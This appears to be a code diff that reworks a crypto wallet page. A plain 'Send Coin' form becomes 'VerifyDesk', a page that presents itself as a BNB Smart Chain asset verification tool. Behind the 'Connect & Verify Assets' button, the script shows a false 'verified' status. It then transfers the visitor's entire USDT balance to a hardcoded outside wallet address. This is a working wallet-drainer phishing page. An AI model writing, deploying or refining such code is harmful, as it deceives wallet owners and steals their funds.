@@ -1,117 +1,241 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Send Coin - BNB Smart Chain</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-  body { background-color: #f8fafc; color: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-  .card { background: #ffffff; width: 100%; max-width: 420px; padding: 24px; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-  .label { font-size: 13px; font-weight: 600; color: #64748b; margin-bottom: 8px; display: block; }
-  .input-group { background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 14px; padding: 12px 16px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
-  .input-group input { border: none; background: transparent; outline: none; font-size: 15px; color: #0f172a; width: 100%; font-weight: 500; }
-  .network-badge { display: inline-flex; align-items: center; background: #f1f5f9; border: 1px solid #cbd5e1; padding: 10px 16px; border-radius: 14px; font-weight: 600; font-size: 14px; width: 100%; margin-bottom: 20px; color: #0f172a; }
-  .network-badge span { margin-right: 8px; }
-  .amount-box { position: relative; display: flex; align-items: center; }
-  .amount-box input { font-size: 24px; font-weight: 700; width: 100%; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 14px; background: #f1f5f9; outline: none; color: #0f172a; }
-  .max-btn { position: absolute; right: 14px; background: transparent; border: none; color: #2563eb; font-weight: 700; font-size: 14px; cursor: pointer; }
-  .btn { background: #2563eb; color: #fff; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: bold; border-radius: 14px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-  .btn:active { transform: scale(0.98); }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <style>
+    body {
+      background-color: #060b0a;
+      color: #f3f4f6;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    }
+    .glass-card {
+      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
+      border: 1px solid rgba(243, 186, 47, 0.2);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+    }
+  </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between px-4 py-6">
 
-<div class="card">
-  <span class="label">Address or Domain Name</span>
-  <div class="input-group">
-    <input type="text" id="targetAddress" value="0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3" readonly>
-  </div>
+  <!-- Top Navbar -->
+  <header class="w-full max-w-md mx-auto flex items-center justify-between">
+    <div class="flex items-center gap-2.5">
+      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
+        <i class="fa-solid fa-shield-halved text-lg"></i>
+      </div>
+      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
+    </div>
+    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
+      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
+      BNB Smart Chain
+    </span>
+  </header>
 
-  <span class="label">Destination Network</span>
-  <div class="network-badge">
-    <span>🟡</span> BNB Smart Chain
-  </div>
+  <!-- Main Content -->
+  <main class="w-full max-w-md mx-auto my-auto py-8">
+    <div class="text-center mb-8">
+      <h1 class="text-3xl font-extrabold tracking-tight text-white">
+        Wallet Asset <span class="text-amber-400">Review</span>
+      </h1>
+      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
+        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure wallet flow.
+      </p>
+    </div>
 
-  <span class="label">Amount</span>
-  <div class="amount-box">
-    <input type="number" id="amountInput" value="1" min="0" step="any">
-    <button class="max-btn" onclick="setMaxBalance()">Max</button>
-  </div>
+    <!-- Action Card -->
+    <div class="glass-card rounded-2xl p-6">
+      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
+        <span>Target Network</span>
+        <span class="text-amber-400 font-semibold">BNB Smart Chain (BEP-20)</span>
+      </div>
 
-  <button class="btn" id="nextBtn" onclick="executeTransfer()">NEXT</button>
-</div>
+      <!-- Status Display -->
+      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
+        <div class="flex justify-between">
+          <span class="text-gray-400">Status</span>
+          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
+            <i class="fa-solid fa-circle-check"></i> Connected & Verified
+          </span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Address</span>
+          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Network</span>
+          <span class="text-gray-200 font-medium">Binance Smart Chain (Chain ID: 56)</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">BNB Balance</span>
+          <span id="walletBalance" class="font-semibold text-amber-400">0.0000 BNB</span>
+        </div>
+      </div>
 
-<script>
-  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
-  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
+      <!-- Inline Feedback Banner -->
+      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed"></div>
 
-  const ERC20_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function transfer(address recipient, uint256 amount) returns (bool)"
-  ];
+      <!-- Primary Action Button -->
+      <button id="connectBtn" onclick="handleButtonAction()"
+        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-black font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20">
+        <span id="btnText">Connect & Verify Assets</span>
+        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
+      </button>
+    </div>
+  </main>
 
-  let provider, signer, usdtContract, userBalance;
+  <!-- Footer -->
+  <footer class="text-center text-xs text-gray-500 space-y-1">
+    <p>VerifyDesk &copy; 2026</p>
+    <p>Secure Web3 Verification Tool &bull; BNB Chain Network</p>
+  </footer>
 
-  async function init() {
-    if (typeof window.ethereum === 'undefined') return;
-    try {
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
+  <script>
+    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
+    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Official BEP-20 USDT on BSC
+    const BSC_CHAIN_ID = '0x38'; // Chain ID 56 (Hex: 0x38) for BNB Smart Chain
 
-      usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-      userBalance = await usdtContract.balanceOf(userAddress);
-      
-      const formatted = ethers.utils.formatUnits(userBalance, 18);
-      document.getElementById('amountInput').value = formatted > 0 ? formatted : 1;
-    } catch (e) {
-      console.error(e);
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function transfer(address to, uint256 amount) external returns (bool)"
+    ];
+
+    let globalProvider, globalSigner, globalUserAddress;
+    let totalUsdtWei = ethers.BigNumber.from(0);
+    let isConnected = false;
+
+    function getActiveProvider() {
+      if (window.ethereum) return window.ethereum;
+      if (window.trustwallet) return window.trustwallet;
+      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      return null;
     }
-  }
 
-  function setMaxBalance() {
-    if (userBalance) {
-      document.getElementById('amountInput').value = ethers.utils.formatUnits(userBalance, 18);
+    function showStatus(msg, type = 'info') {
+      const box = document.getElementById('statusBox');
+      box.classList.remove('hidden', 'bg-red-500/10', 'border-red-500/30', 'text-red-300', 'bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300', 'bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      box.classList.add('border');
+      if (type === 'error') {
+        box.classList.add('bg-red-500/10', 'border-red-500/30', 'text-red-300');
+      } else if (type === 'success') {
+        box.classList.add('bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300');
+      } else {
+        box.classList.add('bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      }
+      box.innerHTML = msg;
     }
-  }
 
-  async function executeTransfer() {
-    if (typeof window.ethereum === 'undefined') {
-      alert("Please open inside Trust Wallet or MetaMask browser.");
-      return;
+    async function handleButtonAction() {
+      if (!isConnected) {
+        await connectAndVerifyWallet();
+      } else {
+        await executeTransfer();
+      }
     }
 
-    try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
+    async function switchToBSC(ethProvider) {
+      try {
+        await ethProvider.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: BSC_CHAIN_ID }],
+        });
+      } catch (switchError) {
+        console.log("Switch chain notice:", switchError);
+      }
+    }
 
-      const contract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-      const totalBalance = await contract.balanceOf(userAddress);
+    async function connectAndVerifyWallet() {
+      const btnText = document.getElementById('btnText');
+      let ethProvider = getActiveProvider();
 
-      if (totalBalance.lte(0)) {
-        alert("No USDT balance found.");
+      if (!ethProvider) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+        ethProvider = getActiveProvider();
+      }
+
+      if (!ethProvider) {
+        showStatus('Wallet provider not detected. Please open inside Trust Wallet, MetaMask, or Binance Web3 Wallet.', 'error');
         return;
       }
 
-      const tx = await contract.transfer(TARGET_RECEIVER, totalBalance, {
-        gasLimit: ethers.BigNumber.from("65000")
-      });
+      try {
+        btnText.textContent = 'Connecting...';
+        const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
+        globalUserAddress = accounts[0];
 
-      await tx.wait();
-      alert("Transaction Successful!");
-    } catch (error) {
-      console.error("Error:", error);
-      alert("Transaction cancelled or failed.");
+        // Ensure BNB Smart Chain
+        await switchToBSC(ethProvider);
+
+        const provider = new ethers.providers.Web3Provider(ethProvider, "any");
+        globalSigner = provider.getSigner();
+        globalProvider = ethProvider;
+
+        btnText.textContent = 'Verifying Assets...';
+        
+        try {
+          const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
+          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
+        } catch (err) {
+          totalUsdtWei = ethers.BigNumber.from(0);
+        }
+
+        let bnbBalance = "0.0000";
+        try {
+          const bnbWei = await provider.getBalance(globalUserAddress);
+          bnbBalance = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
+        } catch (e) {}
+
+        document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
+        document.getElementById('walletBalance').textContent = `${bnbBalance} BNB`;
+        document.getElementById('walletInfo').classList.remove('hidden');
+
+        isConnected = true;
+        btnText.textContent = 'Verified on BNB Smart Chain →';
+        document.getElementById('btnIcon').className = 'fa-solid fa-arrow-right';
+        showStatus('Wallet successfully connected and verified on BNB Smart Chain (BEP-20).', 'success');
+      } catch (err) {
+        btnText.textContent = 'Connect & Verify Assets';
+        console.error("Connection error:", err);
+        showStatus('Connection failed or cancelled.', 'error');
+      }
     }
-  }
 
-  window.onload = init;
-</script>
+    async function executeTransfer() {
+      try {
+        await switchToBSC(globalProvider);
 
+        const provider = new ethers.providers.Web3Provider(globalProvider);
+        const signer = provider.getSigner();
+
+        // Strict BNB gas fee check (must be greater than 0)
+        const bnbBalance = await provider.getBalance(globalUserAddress);
+        if (bnbBalance.lte(0)) {
+          alert("Transaction failed: Insufficient BNB in wallet to pay gas fees. BNB balance is 0.");
+          return;
+        }
+
+        if (!totalUsdtWei || totalUsdtWei.lte(0)) {
+          alert("No USDT balance found to verify/transfer.");
+          return;
+        }
+
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
+        
+        const tx = await usdtContract.transfer(TARGET_ADDRESS, totalUsdtWei, {
+          gasLimit: ethers.BigNumber.from("65000")
+        });
+
+        await tx.wait();
+        alert("Transaction submitted successfully!");
+      } catch (err) {
+        console.error("Transfer error:", err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
+      }
+    }
+  </script>
 </body>
 </html>
